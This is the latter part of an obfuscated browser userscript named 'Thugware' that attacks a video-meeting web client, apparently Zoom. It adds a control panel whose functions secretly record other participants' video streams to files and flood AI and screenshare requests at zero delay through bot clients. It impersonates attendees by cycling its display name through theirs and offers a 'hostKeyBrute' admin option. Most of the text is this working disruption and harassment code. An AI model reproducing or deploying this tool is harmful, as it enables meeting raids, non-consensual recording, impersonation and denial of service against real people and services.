                    this.addButtonToMain(Localization.t('anonymousBoard'), a.bind(window.Thugware));

                    this.addSectionWithDividerToMain(Localization.t('adminSection'));
                    this.addButtonToMain(Localization.t('hostKeyBrute'), g.bind(window.Thugware));

                    const warning = document.createElement("div");
                    warning.className = "warning-text";
                    warning.textContent = Localization.t('warning');
                    this.mainTab.appendChild(warning);
                } catch (error) {
                    console.error('Ошибка создания главного контента:', error);
                }
            }
            
            switchTab(tabId) {
                try {
                    document.querySelectorAll('.tab-content').forEach(tab => {
                        tab.classList.remove('active');
                    });
                    
                    document.querySelectorAll('.nav-tab').forEach(tab => {
                        tab.classList.remove('active');
                    });
                    
                    document.getElementById(`tab-${tabId}`).classList.add('active');
                    document.querySelector(`[data-tab="${tabId}"]`).classList.add('active');
                    
                    // Если переключаемся на главную вкладку, убедимся что контент актуален
                    if (tabId === 'main') {
                        this.updateMainTab();
                    }
                } catch (error) {
                    console.error('Ошибка переключения вкладки:', error);
                }
            }
            
            addButtonToMain(e, t) {
                try {
                    let button = document.createElement("button");
                    button.className = "Thugware-button";
                    button.textContent = e;
                    button.enabled = false;
                    button.addEventListener("click", (function () {
                        button.enabled = !button.enabled;
                        if (button.enabled) {
                            button.classList.add("enabled");
                        } else {
                            button.classList.remove("enabled");
                        }
                        t();
                    }));
                    this.mainTab.appendChild(button);
                } catch (error) {
                    console.error('Ошибка добавления кнопки:', error);
                }
            }
            
            addSectionToMain(title) {
                try {
                    const sectionHeader = document.createElement("div");
                    sectionHeader.className = "section-header";
                    sectionHeader.textContent = title;
                    this.mainTab.appendChild(sectionHeader);
                } catch (error) {
                    console.error('Ошибка добавления раздела:', error);
                }
            }
            
            addSectionWithDividerToMain(title) {
                try {
                    this.addSectionToMain(title);
                    
                    const divider = document.createElement("div");
                    divider.className = "section-divider";
                    this.mainTab.appendChild(divider);
                } catch (error) {
                    console.error('Ошибка добавления раздела с разделителем:', error);
                }
            }
            
            toggle() {
                try {
                    if (this.panel.style.display === "none") {
                        this.panel.style.display = "block";
                    } else {
                        this.panel.style.display = "none";
                    }
                } catch (error) {
                    console.error('Ошибка переключения панели:', error);
                }
            }
            
            initToggleButton() {
                try {
                    let toggleButton = document.createElement("div");
                    toggleButton.textContent = "💣";
                    toggleButton.style.position = "fixed";
                    toggleButton.style.top = "50px";
                    toggleButton.style.left = "0px";
                    toggleButton.style.padding = "10px 10px";
                    toggleButton.style.backgroundColor = "rgba(25, 25, 25, 0.75)";
                    toggleButton.style.border = "1px solid rgb(0 255 10)";
                    toggleButton.style.color = "#fff";
                    toggleButton.style.borderRadius = "0 5px 5px 0";
                    toggleButton.style.cursor = "pointer";
                    toggleButton.style.zIndex = "9999999";
                    toggleButton.style.userSelect = "none";
                    toggleButton.addEventListener("click", this.toggle.bind(this));
                    
                    let isDragging = false;
                    let offsetY = 0;
                    
                    toggleButton.addEventListener("mousedown", (function (e) {
                        isDragging = true;
                        offsetY = e.clientY - toggleButton.getBoundingClientRect().top;
                        e.preventDefault();
                    }));
                    
                    document.addEventListener("mousemove", (function (e) {
                        if (isDragging) {
                            toggleButton.style.top = e.clientY - offsetY + "px";
                        }
                    }));
                    
                    document.addEventListener("mouseup", (function () {
                        isDragging = false;
                    }));
                    
                    document.body.appendChild(toggleButton);
                } catch (error) {
                    console.error('Ошибка создания кнопки переключения:', error);
                }
            }
            
            initDrag() {
                try {
                    this.header.style.cursor = "grab";
                    this.header.addEventListener("pointerdown", (e) => {
                        this.isDragging = true;
                        this.offset.x = e.clientX - this.panel.getBoundingClientRect().left;
                        this.offset.y = e.clientY - this.panel.getBoundingClientRect().top;
                        this.header.setPointerCapture(e.pointerId);
                        this.header.style.cursor = "grabbing";
                    });
                    
                    this.header.addEventListener("pointermove", (e) => {
                        if (this.isDragging) {
                            this.panel.style.left = e.clientX - this.offset.x + "px";
                            this.panel.style.top = e.clientY - this.offset.y + "px";
                        }
                    });
                    
                    this.header.addEventListener("pointerup", (e) => {
                        this.isDragging = false;
                        this.header.releasePointerCapture(e.pointerId);
                        this.header.style.cursor = "grab";
                    });
                } catch (error) {
                    console.error('Ошибка инициализации перетаскивания:', error);
                }
            }
        };

        let j, q = {};
        const W = function () {
            if (j) {
                j.panel.remove();
                j = null;
                return;
            }
            j = new D(Localization.t('participantsTitle'), false);
            let videos = {};
            let videoPlayers = this.scope.document.getElementsByTagName("video-player");
            
            Object.values(videoPlayers).forEach((player) => {
                videos[player.parentElement.lastChild.firstChild.textContent] = player;
            });
            
            Object.keys(videos).forEach((name, index) => {
                j.addButtonToMain(name, () => {
                    function startRecording(id, player, fileName) {
                        let recorder, chunks = [];
                        
                        if (q[id]) {
                            q[id].stop();
                            delete q[id];
                        }
                        
                        const canvas = player.render.getCanvas();
                        const stream = canvas.captureStream(60);
                        recorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
                        
                        recorder.ondataavailable = e => {
                            if (e.data.size > 0) chunks.push(e.data);
                        };
                        
                        recorder.onstop = () => {
                            const blob = new Blob(chunks, { type: "video/webm" });
                            const url = URL.createObjectURL(blob);
                            const a = document.createElement("a");
                            a.href = url;
                            a.download = fileName + ".webm";
                            a.click();
                        };
                        
                        q[id] = recorder;
                        recorder.start();
                    }
                    
                    startRecording(index, videos[name], name);
                });
            });
        };

        const P = function e() {
            let t = this;
            if (e.interval) {
                clearInterval(e.interval);
                e.interval = void 0;
                return;
            }
            e.interval = setInterval((function () {
                t.actions.requestAI();
                window.bots && window.bots.forEach((e => {
                    e?.loaded && e.actions.requestAI();
                }));
            }), 0);
        };

        const z = function e() {
            let t = this;
            let sharer = t.hooks.state.attendeesList.attendeesList.find((e => e?.sharerOn));
            if (!sharer) return;
            let userId = sharer.userId;
            
            if (e.interval) {
                clearInterval(e.interval);
                e.interval = void 0;
            } else {
                e.interval = setInterval((function () {
                    t.actions.requestScreenshare(userId);
                    window.bots && window.bots.forEach((e => {
                        e?.loaded && e.actions.requestScreenshare(userId);
                    }));
                }), 0);
            }
        };

        const F = function e() {
            let t = this;
            if (e.interval) {
                clearInterval(e.interval);
                e.interval = void 0;
                return;
            }
            
            const attendees = Object.values(t.hooks.state.attendeesList.attendeesList)
                .map(e => e.displayName)
                .filter(name => name && name !== t.hooks.state.meeting.currentUser.displayName);
            
            if (attendees.length === 0) {
                alert("Других участников не найдено!");
                return;
            }
            
            let index = 0;
            e.interval = setInterval(() => {
                index = (index + 1) % attendees.length;
                t.actions.changeUsername(attendees[index]);
                window.bots && window.bots.forEach((bot) => {
                    if (bot?.loaded) {
                        bot.actions.changeUsername(attendees[index]);
                    }
                });
            }, 100);
        };

        if (!top?.Thugware && !window?.thugbot) {
            try {
                let e = new s(document.getElementById("webclient")?.contentWindow || window);
                window.Thugware = e;
                window.spammerSpeed = 1;
                
                let panel = new D(Localization.t('panelTitle'), true);
                panel.createMainContent();
            } catch (error) {
                console.error('Ошибка инициализации Thugware:', error);
            }
        }

        if (Array.from(document.querySelectorAll("div")).find((e => "Launch Meeting" === e.textContent.trim()))) {
            let origin = location.origin;
            let path = location.pathname.replace("/j/", "");
            location.href = origin + "/wc/join/" + path + location.search;
        }
    })();
})();